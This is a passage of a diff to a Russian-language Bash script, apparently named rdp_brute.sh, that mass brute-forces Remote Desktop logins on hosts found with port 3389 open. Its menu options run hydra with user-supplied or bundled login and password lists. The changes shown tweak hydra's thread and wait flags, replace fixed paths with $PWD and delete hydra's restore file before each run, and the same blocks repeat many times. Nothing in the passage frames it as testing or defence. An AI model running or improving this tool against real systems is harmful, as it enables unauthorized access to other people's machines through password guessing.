 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2723,7 +2855,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2732,7 +2864,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2760,6 +2892,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -2771,7 +2907,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2781,7 +2917,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2791,7 +2927,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2800,7 +2936,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2828,6 +2964,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -2839,7 +2979,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2849,7 +2989,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2859,7 +2999,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2868,7 +3008,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2895,6 +3035,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -2906,7 +3050,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2916,7 +3060,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2926,7 +3070,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2935,7 +3079,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2964,6 +3108,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -2975,7 +3123,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2985,7 +3133,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2995,7 +3143,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3004,7 +3152,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3033,6 +3181,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -3044,7 +3196,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3054,7 +3206,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3064,7 +3216,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3073,7 +3225,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3102,6 +3254,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -3113,7 +3269,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3123,7 +3279,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3133,7 +3289,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3142,7 +3298,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3171,6 +3327,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -3182,7 +3342,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3192,7 +3352,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3202,7 +3362,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3211,7 +3371,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3240,6 +3400,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -3251,7 +3415,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3261,7 +3425,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3271,7 +3435,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3280,7 +3444,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3309,6 +3473,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -3320,7 +3488,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3330,7 +3498,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3340,7 +3508,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3349,7 +3517,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3378,6 +3546,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -3389,7 +3561,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3399,7 +3571,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3409,7 +3581,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3418,7 +3590,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3447,6 +3619,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -3458,7 +3634,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3468,7 +3644,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3478,7 +3654,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3487,7 +3663,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3516,6 +3692,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -3527,7 +3707,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3537,7 +3717,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
